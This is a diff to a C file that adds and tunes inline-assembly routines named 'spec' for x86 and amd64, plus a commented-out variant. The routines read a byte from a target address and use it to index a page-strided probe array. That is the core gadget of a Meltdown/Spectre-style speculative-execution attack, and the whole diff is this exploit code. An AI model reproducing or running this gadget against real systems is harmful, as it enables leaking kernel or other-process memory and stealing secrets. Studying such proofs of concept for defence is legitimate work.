@@ -219,7 +219,44 @@ static inline void spec(char *addr , char *base )
 	startVector=vector;
 	ptrAddr=*startVector;
 	printf("so far so good\n");
+#ifdef __amd64__
+		asm __volatile__(
+			"nop				\n"
+			"nop				\n"
+			"nop				\n"
+			"start:				\n"
+			"mov %0 , %%rax 				\n"
+			"mov %1 , %%rbx				\n"
+			"xor %%rsi,%%rsi				\n"
+			"repeat:				\n"
+			"	nop				\n"
+			"	nop				\n"
+			"	mov (%%rax) , %%rdx 			\n"
+			"	.rept 30			\n"
+			"	inc %%rsi			\n"
+			"	.endr			\n"
+			"	nop			\n"
+			"	xor %%rcx , %%rcx			\n"
+			"	cmp $330, %%rsi			\n"
 
+			"	jz fim			\n"
+			"	mov (%%rdx) , %%cl			\n"
+			"	shl $12 , %%rcx			\n"
+			"	mov (%%rbx,%%rcx,1) , %%cl			\n"
+			"	add $8 , %%rax			\n"
+			"	jmp repeat				\n"
+			"fim:			\n"
+			"	nop				\n"
+			"	nop			\n"
+			://no output
+			:"r" (startVector) , "m" (base) , "m" (fim_offset)
+			: "rax" , "rbx" , "rcx" , "rdx" , "rsi"
+			
+			);
+	//dummy=*(((unsigned char)vector[101])*4096+base);
+	//printf("%c\n",dupmmy);
+
+#else
 		asm __volatile__(
 			"nop				\n"
 			"nop				\n"
@@ -234,10 +271,10 @@ static inline void spec(char *addr , char *base )
 			"	nop				\n"
 			"	mov (%%eax) , %%edx 			\n"
 			"	xor %%ecx , %%ecx			\n"
-			"	.rept 100			\n"
+			"	.rept 1			\n"
 			"	inc %%esi			\n"
 			"	.endr			\n"
-			"	cmp $10000,%%esi			\n"
+			"	cmp $90,%%esi			\n"
 
 			"	jz fim			\n"
 			"	mov (%%edx) , %%cl			\n"
@@ -253,8 +290,61 @@ static inline void spec(char *addr , char *base )
 			: "eax" , "ebx" , "ecx" , "edx" , "esi" 
 			
 			);
+	//dummy=*(((unsigned char)vector[101])*4096+base);
 	
+#endif
 }
+/*
+static inline void spec2(char *addr , char *base )
+{
+
+	asm __volatile__(
+			"				\n"
+			"mov %0 , %%rcx				\n"
+			"mov %1,%%rbx				\n"
+			"nop				\n"
+			"				\n"
+			"				\n"
+			"xor %%rdx,%%rdx				\n"
+			".rept 500				\n"
+			"add $141,%%rdx				\n"
+			"jz stop				\n"
+			".endr			\n"
+			"				\n"
+			"				\n"
+			"				\n"
+			"xor %%rdx,%%rdx				\n"
+			"xor %%rsi,%%rsi				\n"
+			".rept 100				\n"
+			"add $141,%%rsi				\n"
+			"sub $141,%%rsi				\n"
+			".endr			\n"
+			"				\n"
+			"				\n"
+			"				\n"
+			"				\n"
+			"				\n"
+			"jz stop				\n"
+			"mov (%%rcx),%%dl				\n"
+			"shl $12 , %%rdx				\n"
+			"mov (%%rbx,%%rdx),%%cl				\n"
+			"				\n"
+			"				\n"
+			"				\n"
+			"				\n"
+			"				\n"
+			"				\n"
+			"				\n"
+			"stop:				\n"
+			"	nop				\n"
+			://no output
+			: "m"(addr) , "m" (base) 
+			: "rax" , "rbx" , "rcx" , "rdx" 
+			
+			);
+
+}
+*/
 
 int main(void)
 {
